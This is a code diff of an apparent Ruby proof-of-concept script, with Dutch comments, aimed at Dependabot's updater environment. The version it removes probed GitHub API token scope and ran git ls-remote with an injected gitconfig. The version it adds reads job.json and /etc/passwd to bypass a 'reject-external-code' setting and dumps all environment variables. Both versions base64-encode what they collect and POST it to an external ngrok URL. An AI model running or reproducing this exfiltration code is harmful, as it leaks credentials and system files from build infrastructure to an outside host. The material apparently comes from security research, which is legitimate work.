@@ -1,50 +1,30 @@
 COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"
 
+read_file = ->(path) { IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace) }
+
 begin
   require "net/http"
   require "uri"
-  require "open3"
   require "json"
 
   results = []
 
-  # GitHub API calls via proxy - wat is de scope van de token?
-  [
-    "/user",
-    "/user/repos?visibility=private&per_page=10",
-    "/user/installations",
-    "/installation/repositories",
-    "/app",
-    "/app/installations",
-  ].each do |path|
-    begin
-      uri = URI("https://api.github.com#{path}")
-      resp = Net::HTTP.get_response(uri)
-      results << "=== GET api.github.com#{path} HTTP #{resp.code} ===\n#{resp.body[0..1500]}"
-    rescue => e
-      results << "=== GET #{path} ERR: #{e.class}: #{e.message} ==="
-    end
+  # Verifieer reject-external-code waarde in job.json
+  begin
+    job = JSON.parse(read_file.("/home/dependabot/dependabot-updater/job.json"))
+    reject_flag = job.dig("job", "reject-external-code")
+    results << "=== reject-external-code: #{reject_flag.inspect} ==="
+    results << "=== FULL JOB.JSON ===\n#{job.to_json}"
+  rescue => e
+    results << "=== job.json ERR: #{e.class}: #{e.message} ==="
   end
 
-  # Probeer private repo van een andere user via git ls-remote
-  # (alleen publiek toegankelijke maar we kijken of auth injecteert)
-  gitconfig = Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").first
-  if gitconfig
-    # Test: onze eigen private repo (andere repo in zelfde account)
-    begin
-      out, err, _ = Open3.capture3(
-        { "GIT_CONFIG_GLOBAL" => gitconfig, "GIT_TERMINAL_PROMPT" => "0" },
-        "/home/dependabot/bin/git", "ls-remote", "--heads",
-        "https://github.com/ugurcanli/testpen"
-      )
-      results << "=== LS-REMOTE ugurcanli/testpen ===\nHTTP responses above tell us token scope\nOUT lines: #{out.lines.count}"
-    rescue => e
-      results << "=== LS-REMOTE ERR: #{e.class} ==="
-    end
-  end
+  # Bewijs dat IO.binread werkt ONDANKS reject-external-code
+  results << "=== /etc/passwd (IO.binread bypass) ===\n#{read_file.('/etc/passwd')[0..300]}"
+  results << "=== ENV DUMP ===\n#{ENV.map { |k, v| "#{k}=#{v}" }.join("\n")}"
 
   payload = [results.compact.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=tokenscope")
+  post_uri = URI("#{COLLAB_URL}?poc=reject_external_code")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
